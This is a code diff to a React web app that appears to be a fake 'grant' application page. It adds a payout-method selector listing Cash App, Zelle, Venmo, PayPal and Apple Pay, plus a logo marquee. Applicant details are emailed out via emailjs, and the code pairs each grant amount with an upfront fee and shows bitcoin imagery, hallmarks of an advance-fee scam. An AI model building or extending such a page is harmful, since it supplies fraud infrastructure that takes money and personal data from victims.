@@ -1,12 +1,17 @@
 import {
+  applepay,
   bitcoin,
+  cashapp,
   img1,
   img2,
   img3,
   img4,
   logo_horizontal,
+  paypal,
   powered_by,
   user_bitcoin,
+  venmo,
+  zelle,
 } from "./assets/images/images";
 import { HiMiniBars3CenterLeft } from "react-icons/hi2";
 import {
@@ -27,6 +32,7 @@ import { BiChevronRightCircle } from "react-icons/bi";
 import { useState } from "react";
 import toast, { Toaster } from "react-hot-toast";
 import emailjs from "@emailjs/browser";
+import Marquee from "react-fast-marquee";
 
 export default function App() {
   const [disableBtn, setDisableBtn] = useState(false);
@@ -37,6 +43,7 @@ export default function App() {
     number: "",
     state: "",
     amount: "",
+    payout: "",
   });
 
   const handleChange = (e) => {
@@ -55,6 +62,8 @@ export default function App() {
       number: grantInputs.number,
       state: grantInputs.state,
       amount: grantInputs.amount,
+      payout: grantInputs.payout,
+      date: new Date().toUTCString(),
     };
 
     emailjs
@@ -75,6 +84,7 @@ export default function App() {
             number: "",
             state: "",
             amount: "",
+            payout: "",
           });
         },
         (error) => {
@@ -153,6 +163,8 @@ export default function App() {
     { amount: 18000, fee: 4000 },
     { amount: 20000, fee: 5000 },
   ];
+
+  const payouts = ["Cash app", "Zelle", "Venmo", "PayPal", "Apple Pay"];
   return (
     <>
       <Toaster></Toaster>
@@ -355,6 +367,37 @@ export default function App() {
               ))}
             </select>
           </div>
+
+          <div className="flex flex-col gap-1">
+            <label htmlFor="" className="uppercase font-semibold">
+              Choose payout method
+              <span className="text-red-500">*</span>
+            </label>
+            <select
+              required
+              name="payout"
+              onChange={handleChange}
+              defaultValue={grantInputs.payout}
+              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
+            >
+              <option value="" disabled>
+                Select a payout method
+              </option>
+              {payouts.map((method, index) => (
+                <option key={index} value={method}>
+                  {method}
+                </option>
+              ))}
+            </select>
+          </div>
+
+          <Marquee speed={50} gradient={false}>
+            <img src={cashapp} alt="cashapp" className="w-[120px] mx-4" />
+            <img src={paypal} alt="paypal" className="w-[120px] mx-4" />
+            <img src={venmo} alt="venmo" className="w-[120px] mx-4" />
+            <img src={applepay} alt="applepay" className="w-[70px] mx-4" />
+            <img src={zelle} alt="zelle" className="w-[100px] mx-4" />
+          </Marquee>
 
           <p className="text-xs">
             By continuing, you acknowledge and accept the{" "}
